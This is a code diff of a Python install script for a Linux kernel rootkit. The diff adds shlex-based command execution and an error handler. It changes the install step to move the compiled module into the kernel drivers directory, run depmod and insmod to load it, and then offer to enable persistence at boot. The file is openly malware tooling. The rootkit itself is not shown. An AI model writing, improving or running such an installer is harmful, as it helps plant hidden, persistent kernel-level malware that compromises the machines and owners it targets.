@@ -3,6 +3,7 @@
 
 import os
 import sys
+import shlex
 import subprocess as sp
 from shutil import move
 # import argparse
@@ -70,17 +71,21 @@ def prompt(text, default=""):
 
 def run_cmd(command):
 	"""
-	Wrapper on subprocess.run to handle shell commands as either a list of args
-	or a single string.
+	Wrapper on subprocess.run to handle shell commands as either a list
+	of args or a single string.
 	:return: True if process exits successfully and False otherwise
 	"""
 	# TODO: Pipe all output to sp.DEVNULL when done fine-tuning build script.
 	if not isinstance(command, list):
-		process = sp.run(command.split(), stdout=sp.PIPE, stderr=sp.PIPE)
-		return process.returncode == 0
-	else:
-		process = sp.run(command, stdout=sp.PIPE, stderr=sp.PIPE)
-		return process.returncode == 0
+		command = shlex.split(command)
+
+	print_status("Executing: {}".format(command))
+	return sp.run(command, stdout=sp.PIPE, stderr=sp.PIPE).returncode == 0
+
+
+def run_cmd_error_handler():
+	print_error("Error running command. Exiting.")
+	sys.exit(1)
 
 
 def create_config_header_file(user_defines: dict):
@@ -160,21 +165,30 @@ def install(kernel_version):
 	else:
 		print_success("Successful compilation.")
 
-	# TODO: Move compiled components to the right place.
+	# TODO: Move compiled components to the right place. Maybe drop it in "/lib/modules/{0}/garden?
 	print_status("Installing rootkit...")
 	module_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
 	if not os.path.exists(module_dir):
 		os.mkdir(module_dir)
 
+	module_dest_path = module_dir + ".ko"
+
 	try:
 		# TODO: Decide if moving the .ko file to the module_dir is necessary
 		# TODO: Actually load the kernel module
-		move("{}.ko".format(config["MODULE_NAME"]), module_dir)
-		# depmod && insmod /$MODULE/$MODULE.ko
-		print_success("Successful installation.")
+		move(config["MODULE_NAME"] + ".ko", module_dest_path)
 	except IOError as e:
 		print_error("Unable to copy file. {}".format(e))
 		sys.exit()
+
+	# depmod && insmod /$MODULE/$MODULE.ko
+	if not run_cmd("depmod"):
+		run_cmd_error_handler()
+
+	if not run_cmd("insmod {}".format(module_dest_path)):
+		run_cmd_error_handler()
+
+	print_success("Successful installation.")
 
 	# Option to enable persistence by making the module load on boot.
 	if prompt_yes_no("Enable persistence?"):
